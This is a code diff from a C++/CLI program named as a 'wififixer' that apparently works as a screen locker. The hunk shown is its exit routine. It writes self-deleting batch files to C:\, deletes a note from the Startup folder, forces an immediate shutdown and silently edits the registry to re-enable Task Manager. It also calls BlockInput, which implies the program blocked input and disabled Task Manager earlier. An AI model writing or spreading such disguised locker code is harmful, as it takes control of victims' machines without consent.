@@ -341,17 +341,19 @@ namespace wififixer {
 			}
 			std::ofstream clear("C:\\clear.bat");
 			if (clear.is_open()) {
-				clear << "@echo off\nsetlocal EnableDelayedExpansion\n\n>nul 2>&1\"%SYSTEMROOT%\\system32\\icacls.exe\" \"%SYSTEMROOT%\\system32\\config\\system\" && (set \"cmd=runas /user:Administrator \"%~dpnx0\"\"\ngoto doCmd\n) || (\necho Требуются права администратора для выполнения этого скрипта.\npause\nexit /b1n)\n\n:doCmd\nDEL \"C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\README.txt\"\ndel %0";
+				clear << "@echo off\nsetlocal EnableDelayedExpansion\n\n>nul 2>&1\"%SYSTEMROOT%\\system32\\icacls.exe\" \"%SYSTEMROOT%\\system32\\config\\system\" && (set \"cmd=runas /user:Administrator \"%~dpnx0\"\"\ngoto doCmd\n) || (\necho Administrator rights are required to run this script.\npause\nexit /b1n)\n\n:doCmd\nDEL \"C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\README.txt\"\ndel %0";
 				clear.close();
 			}
-			std::ofstream shutdown("C:\\sleep.bat");
-			if (shutdown.is_open()) {
-				shutdown << "shutdown /s /t 00\ndel %0";
-				shutdown.close();
-			}
-			(gcnew System::Diagnostics::Process())->Start("C:\\sleep.bat");
-			BlockInput(false);
+			system("shutdown /s /t 00");
 			right_close = true;
+			BlockInput(false);
+			std::ofstream disable_task("C:\\1.reg");
+			if (disable_task.is_open()) {
+				disable_task << "Windows Registry Editor Version 5.00\n\n[HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System]\n\"DisableTaskMgr\"=dword:00000000";
+				disable_task.close();
+				system("regedit /s C:\\1.reg >nul");
+				remove("C:\\1.reg");
+			}
 			Application::Exit();
 		}
 	}
